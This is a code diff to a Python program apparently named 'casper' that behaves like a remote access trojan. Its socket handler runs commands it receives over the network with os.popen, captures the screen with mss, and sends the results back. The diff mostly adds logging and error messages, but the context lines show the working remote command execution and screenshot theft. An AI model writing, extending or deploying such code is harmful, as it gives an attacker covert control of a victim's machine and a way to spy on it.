@@ -45,10 +45,13 @@ def socket_control():
 								process_create = os.popen(data.split()[1])
 								process_result = process_create.read()
 								if process_result:
+									logging.debug("[casper] Successfully ran command {}".format(data.split()[1]))
 									socket_server.send(encode(process_result))
 								else:
+									logging.debug("[casper] Error while getting command result")
 									socket_server.send(encode("\nError while getting command result\n"))
 							except Exception as e:
+								logging.debug("[casper] Error while executing command")
 								socket_server.send(encode("\nError while executing command\n"))
 						elif (data.split()[0] == "quit"):
 							socket_server.send(encode("\nExiting/shutting down server\n"))
@@ -72,18 +75,18 @@ def socket_control():
 						elif (data.split()[0] == "screenshot"):
 								try:
 									with mss.mss() as screen:
-										logging.debug('[casper] Getting monitors')
+										logging.debug("[casper] Getting monitors")
 										image = screen.grab(screen.monitors[1-1])
 										
-										logging.debug('[casper] Reading image raw_bytes')
+										logging.debug("[casper] Reading image raw_bytes")
 										raw_bytes = mss.tools.to_png(image.rgb,image.size)
 										
-										logging.debug('[casper] Successfully read image raw_bytes')
+										logging.debug("[casper] Successfully read image raw_bytes")
 										socket_server.send(encode(raw_bytes))
 										socket_server.send(encode("\nSuccessfully received screenshot\n"))	
 								except Exception as e:
-									logging.debug('[casper] Error saving screenshot')
-									return False
+									logging.debug("[casper] Error saving screenshot >> {}".format(e))
+									socket_server.send(encode("\nUnable to take screenshot\n"))
 						else:
 							pass
 				except Exception as e:
